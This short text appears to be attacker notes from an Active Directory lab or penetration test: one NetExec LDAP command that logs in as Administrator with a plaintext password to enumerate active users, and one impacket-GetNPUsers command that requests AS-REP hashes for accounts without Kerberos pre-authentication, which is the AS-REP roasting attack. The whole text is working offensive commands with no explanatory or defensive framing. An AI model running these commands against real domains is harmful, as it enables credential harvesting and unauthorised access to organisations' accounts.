
nxc ldap 192.168.10.20 -u Administrator -p 'admin123;' --active-users
impacket-GetNPUsers DC01.local/ -dc-ip 192.168.10.20 -no-pass -usersfile user.txt
